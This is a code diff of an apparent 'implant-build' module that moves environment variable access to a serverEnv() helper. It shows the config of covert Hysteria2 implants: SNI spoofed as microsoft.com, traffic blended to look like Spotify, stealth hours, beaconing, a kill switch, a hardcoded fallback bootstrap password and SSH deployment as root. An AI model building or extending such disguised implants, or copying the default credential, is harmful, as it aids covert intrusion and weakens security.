@@ -11,6 +11,7 @@ import { join } from "node:path"
 import { createHash, randomUUID } from "node:crypto"
 import { prisma } from "@/lib/db"
 import logger from "@/lib/logger"
+import { serverEnv } from "@/lib/env"
 
 const execAsync = promisify(exec)
 const log = logger.child({ module: "implant-build" })
@@ -126,7 +127,7 @@ export async function compileImplant(req: BuildRequest, retryCount: number = 0):
     const implantConfig = {
       implant_id: implantId,
       servers: [node.hostname],
-      password: process.env.IMPLANT_DEFAULT_PASSWORD || "dpanel-implant-bootstrap-token",
+      password: serverEnv().IMPLANT_DEFAULT_PASSWORD || "dpanel-implant-bootstrap-token",
       sni: req.customSni || "www.microsoft.com",
       obfs: "salamander",
       masquerade: "proxy",
@@ -140,7 +141,7 @@ export async function compileImplant(req: BuildRequest, retryCount: number = 0):
       heartbeat_interval: 300,
       network_aware: true,
       stealth_hours: [0, 1, 2, 3, 4, 5, 22, 23],
-      subscription_url: `${process.env.NEXT_PUBLIC_BASE_URL || "http://localhost:3000"}/api/sub/hysteria2?token=IMPLANT_TOKEN&implant=true`,
+      subscription_url: `${serverEnv().NEXT_PUBLIC_APP_URL}/api/sub/hysteria2?token=IMPLANT_TOKEN&implant=true`,
       stealth_level: req.stealthLevel || "high",
       traffic_blend: req.trafficBlendProfile || "spotify",
       kill_switch: req.killSwitchTrigger || "72h_no_beacon",
@@ -253,7 +254,7 @@ export async function compileImplant(req: BuildRequest, retryCount: number = 0):
 
     // 8. Deploy to node via SSH if configured
     let deployedTo = node.hostname
-    if (req.autoStart && process.env.DEPLOY_SSH_KEY) {
+    if (req.autoStart && serverEnv().DEPLOY_SSH_KEY) {
       const deployResult = await deployViaSSHWithRetry(binaryPath, node.hostname, implantId, req.targetOs, maxRetries)
       deployedTo = deployResult.deployedTo
       if (deployResult.warnings) {
@@ -310,9 +311,10 @@ async function deployViaSSHWithRetry(
   maxRetries: number = 3,
   retryCount: number = 0
 ): Promise<{ deployedTo: string; warnings?: string[] }> {
-  const sshKey = process.env.DEPLOY_SSH_KEY!
-  const sshUser = process.env.DEPLOY_SSH_USER || "root"
-  const remoteDir = process.env.DEPLOY_REMOTE_DIR || "/opt/implants"
+  const env = serverEnv()
+  const sshKey = env.DEPLOY_SSH_KEY!
+  const sshUser = env.DEPLOY_SSH_USER
+  const remoteDir = env.DEPLOY_REMOTE_DIR
   const remotePath = `${remoteDir}/h2-implant-${implantId}`
   const warnings: string[] = []
 
